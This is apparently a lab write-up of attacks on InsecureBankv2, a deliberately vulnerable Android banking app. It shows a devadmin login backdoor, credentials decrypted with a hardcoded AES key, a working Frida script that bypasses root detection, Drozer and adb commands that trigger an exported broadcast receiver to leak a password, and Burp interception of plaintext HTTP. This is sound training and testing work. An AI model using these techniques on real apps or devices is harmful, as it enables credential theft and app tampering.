# Insecurebankv2 APK Analysis

## Background

Insecurebankv2 is vulnerable Android app made for security enthusiasts and developers to learn the Android insecurities. The app can be found here: https://github.com/dineshshetty/Android-InsecureBankv2. This post outlines the vulnerabilities discovered during static and dynamic analysis of the app.


## Setup
There are two components in the package:
- AndroLab - Backend server that handles and respond to requests from Insecurebankv2 
- InsecureBankv2.apk - The vulnerable Android applciation

![setup](/assets/images/test/setup.png)


## Tools

The following tools were used in the analysis:
| Tool name                  | Purpose                                                                                                                        |
|:---------------------------|:-------------------------------------------------------------------------------------------------------------------------------|
| Genymotion                 | Android Emulator that will run the Insecurebankv2                                                                              |
| jadx                       | Android APK decompiler                                                                                                         |
| Android Debug Bridge (adb) | Commandline tool to communicate with the emulator                                                                              |
| Frida                      | Dynamic instrumentation toolkit to analyze and manipulate the Insecurebankv2 app during runtime                                |
| Drozer                     | Security testing framework for Android. Assumes the role as an app to interact with Android runtime and the Insecurebankv2 app |
| Burpsuite                  | Web application security testing tool to be used as a proxy to intercept HTTP requests betwene Insecurebankv2 and AndroLab     |


## Methodology

To begin the assessment, I decompiled the InsecureBankv2.apk using jadx. This allowed me to perform a thorough static analysis of the application’s logic and identify several vulnerabilities, including those intentionally embedded by the original developer for testing purposes. I then validated these issues through dynamic testing on an emulator to confirm their exploitability in a real-world scenario.


# Table of Contents
1. [Developer Backdoors](#developer-backdoors)
2. [Exploiting Weak Cryptography](#exploiting-weak-cryptography)
3. [Root Detection and Bypass](#root-detection-and-bypass)
4. [Flawed Broadcast Receivers](#flawed-broadcast-receivers)
5. [Insecure HTTP connections](#insecure-http-connections)
6. [Mitigation Measures](#mitigation-measures)

## Findings

### Developer Backdoors


In the `LoginActivity` class, a listener is attached to the login button, which triggers the `performLogin()` method. This method creates an `Intent` to the `DoLogin` class, passing the username and password.


![login_1](/assets/images/test/login_1.png)

![login_2](/assets/images/test/login_2.png)


In the `DoLogin` class, the username and password are extracted from the intent and processed in `postData()`.

![login_3](/assets/images/test/login_3.png)


Two HTTP POST requests are made: one to `/login` and the other to `/devlogin`. If the username is `devadmin`, the second request is made to `/devlogin`, bypassing the normal authentication flow.

If the HTTP request returns a valid response, `savecreds()` is called. This will be looked at in the next section: [Exploiting Weak Cryptography Section](#exploiting-weak-cryptography)
![login_4](/assets/images/test/login_4.png)

On the emulator side, logging in with `devadmin` and a random password `secretp@55w0rd` grants access. The password is not checked here but this password will be used in explaining the vulnerability in the next section.
![devadmin_login](/assets/images/test/devadmin_login.png) 

![postlogin](/assets/images/test/postlogin.png) 



### Exploiting Weak Cryptography

The `saveCreds` method writes the username and password into a `SharedPreferences` file. The username is Base64-encoded, while the password is encrypted using AES in CBC mode with a hardcoded key and IV.
![creds_1](/assets/images/test/creds_1.png) 

In `CryptoClass` where the crypto methods are called, the encryption key is harded as `This is the super secret key 123` and initialisation vector is also hard coded as an array of 16 zero hexadecimal bytes. The cryptograhic algorithm implmented is AES in Cipher Block Chaining (CBC) mode.
![creds_2](/assets/images/test/creds_2.png) 

With this observation, I set out to extract the credentials stored in `mySharedPrefences` and retrieve the password in plaintext.

The first step was to check if the `mySharedPrefences` exists. I used adb to connect to the emulator and opened a shell.

```cmd
adb connect 192.168.56.102:5555
adb shell
```
Changing the present working directory to insecurebankv2's folder and listing files, `shared_prefs` appears in the result
![creds_3](/assets/images/test/creds_3.png) 

A little googling reveals that Android stores Shared Preferences settings as XML file in `shared_prefs` folder, as stated [here](https://www.digitalocean.com/community/tutorials/android-shared-preferences-example-tutorial)

I then use adb to pull the `shared_prefs` folder
```cmd
adb pull /data/data/com.android.insecurebankv2/shared_prefs
```
![creds_4](/assets/images/test/creds_4.png) 

Opening `mySharedPreferences.xml` shows the saved base64 encoded username and encrypted base64 encoded password.
![creds_5](/assets/images/test/creds_5.png) 

Using cyberchef, I was able to decrypt the password
![creds_6](/assets/images/test/creds_6.png) 
![creds_7](/assets/images/test/creds_7.png) 



### Root Detection and Bypass

In the postlogin page, the page shows that the android device is rooted.
![postlogin](/assets/images/test/postlogin.png) 

The code that is responsible for displaying the root status is in the `showRootStatus` method of the PostLogin activity. It displays the rooted message if either `doesSuperuserApkExist` or `doesSUexist`  returns true.
![antiroot_1](/assets/images/test/antiroot_1.png) 


The methods return true if the following conditions are met:
 - `doesSuperuserApkExist`: file `/system/app/Superuser.apk` exists
 - `doesSUexist`: binary `su` is installed. It does this by   using the `which` command. 
 These techniques are commonly used to defend againt anti-reversing as mentioned [here](https://mas.owasp.org/MASTG/0x05j-Testing-Resiliency-Against-Reverse-Engineering/#google-play-integrity)

![antiroot_2](/assets/images/test/antiroot_2.png) 

I used Frida with the intention to hook the two functions to always return false, using the following python script:

```py
import frida
import time

jscode = """
console.log("Script loaded successfully"); 

Java.perform(function x() {
    console.log("Inside java perform function"); 

    // Targeting the PostLogin class
    var my_class = Java.use("com.android.insecurebankv2.PostLogin");
    
    my_class.doesSUexist.implementation = function (x) {
        console.log("**** SU Root Check Bypassed ****" )
        return false
    };
    
    my_class.doesSuperuserApkExist.implementation = function (x) {
        console.log("**** SuperuserAPK Root Check Bypassed ****")
        return false
    };
});
"""

device = frida.get_usb_device()
pid = device.spawn(["com.android.insecurebankv2"])
device.resume(pid)
time.sleep(1)
session = device.attach(pid)
#script = session.create_script(open("frida_script.js").read())
script = session.create_script(jscode)
script.load()

input()
```

Pushing Frida server to the emulator and starting it
```cmd
adb push frida-server-16.7.18-android-x86_64 /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"
```

On my local machine with frida installed, I ran the following commands to confirm that frida server is working well on the android device
```cmd
frida-ps -U
```
![antiroot_3](/assets/images/test/antiroot_3.png) 

I then execute the python script.
```cmd
python frida_python.py
```

Revisiting the PostLogin, Frida confirms the two functions have been bypassed.
![antiroot_4](/assets/images/test/antiroot_4.png) 

The text on the postlogin page now shows that the device is not rooted.
![antiroot_5](/assets/images/test/antiroot_5.png) 



### Flawed Broadcast Receivers

In the AndroidManifest.xml, there is an exported broadcast receiver MyBroadCastReceiver with no permissions set, making it accessible by other apps.
![broadcast_1](/assets/images/test/broadcast_1.png) 

Broadcast receivers are components used for Inter-process Communication. Improperly implemented broadcast receivers can be abused by attackers to gain unauthorised access to execute behavior in the application. In this instance, the broadcast receiver is exported with null permissions and can be used by other apps.

Looking at the `MyBroadCastReceiver` class
![broadcast_2](/assets/images/test/broadcast_2.png) 
1. The parameters `phonenumber` and `newpass` in the intent is retrieved. In order for the broadcast to trigger, these two parameters are required.
2. `mySharedPreferences` is opened, and the encrypted password is retrieved
3. The password is decrypted and put into  `textMessage`
4. The `textMessage` is sent via the `smsManager.sendTextMessage`

The approach I took was to trigger the broadcast receiver using Drozer and leak the `textMessage` when `smsManager.sendTextMessage` is called.

I installed the drozer-agent in the android emulator and opened the drozer agent to turn it active.
```cmd
adb install drozer-agent.apk
```
![broadcast_3](/assets/images/test/broadcast_3.png) 

On the I installed the drozer-agent in the android emulator and configured the drozer session to be connected via usb.
```cmd
adb forward tcp:31415 tcp:31415
drozer console connect
```

On another terminal window, i use adb to view logcat
```cmd
adb logcat
```

On the drozer console, i ran the following command below that uses the `theBroadcast` action, passing two string parameters which are required for the receiver to be triggered.
```cmd
run app.broadcast.send --action theBroadcast --extra string phonenumber 123456789 --extra string newpass supersecurepass
```

The plain password is decrypted in textMessage and logged in logcat.
![broadcast_4](/assets/images/test/broadcast_4.png) 


### Insecure HTTP connections

The app uses HTTP for communication, transmitting sensitive data, including user credentials, in plaintext.
![http_1](/assets/images/test/http_1.png) 

I used burpsuite as a proxy to intercept the HTTP traffic.

After configuring the emulator's proxy settings via ADB:
```cmd
adb shell settings put global http_proxy 192.168.18.7:8080
```

I then clicked on the `change password` button in the application with a new `devadmin` password. As Burpsuite intercepts the http traffic, the credentials can be seen to be transmitted in plaintext during the password change process. 
![http_1](/assets/images/test/http_1.png) 


## Mitigation Measures
To mitigate the above vulnerabilities identified in InsecureBankv2, the following security best practices should be implemented:

- Avoid hardcoding sensitive information such as credentials and encryption keys
- Implement multi-factor authentication to protect user accounts
- Choose a more secure encryption mode i.e. AES-GCM 
- Store keys securely and use a random IV, avoid using predictable keys and IV
- Implement additional root detection checks by using more sophisticated tools like RootBeer. i.e. Rootbeer
- Restrict broadcast receivers by setting proper permissions and avoiding exportation
- Implement certificate pinning 
- Use HTTPS for all network connections to protect sensitive information.


<!--
Setup
```
adb connect 192.168.56.102:5555
adb install InsecureBankv2.apk
```

192.168.56.102:5555(android)

192.168.18.6:8888 (server)

Login bypass

```
adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin\
Result: Starting: Intent { cmp=com.android.insecurebankv2/.PostLogin }
```

```
java -jar apktool_2.11.1.jar d InsecureBankv2.apk -o test

java -jar apktool_2.11.1.jar b C:\Users\REM\Downloads\test
```

```
keytool -genkey -v -keystore ctf.keystore -alias ctfKeystore -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ctf.keystore C:\Users\REM\Downloads\test\dist\InsecureBankv2_mod.apk ctfKeystore
```

```
adb 
adb pull /data/data/com.android.insecurebankv2/shared_prefs
```


```
adb jdwp
adb forward localhost:12345 jdwp:3357
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=12345
```


```
adb push frida-server-16.7.18-android-x86_64 /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

frida-ps -U
frida -U com.android.insecurebankv2 -l frida_script.js --no-pause

```

```
adb shell am broadcast -a theBroadcast -n com.android.unsecurebankv2/.MyBroadCastReceiver --es phonenumber 15555218135 -es newpass sssss
```
```
adb install drozer-agent.apk

adb forward tcp:31415 tcp:31415
drozer console connect
run app.broadcast.send --action theBroadcast --extra string phonenumber 123456789 --extra string newpass supersecurepass


adb logcat

adb shell settings put global http_proxy 192.168.18.7:8080
adb shell settings put global http_proxy :0 
```


***TODO***
-create fake xml files(?) devadmin with password(?) X
-demostrate how to decrypt credentials and show that it works in the app X
-patch code to bypass root detection X
-use of frida
Exploiting Android Vulnerable Broadcast Receiver
- Insecure HTTP connection

secretp@55w0rd -->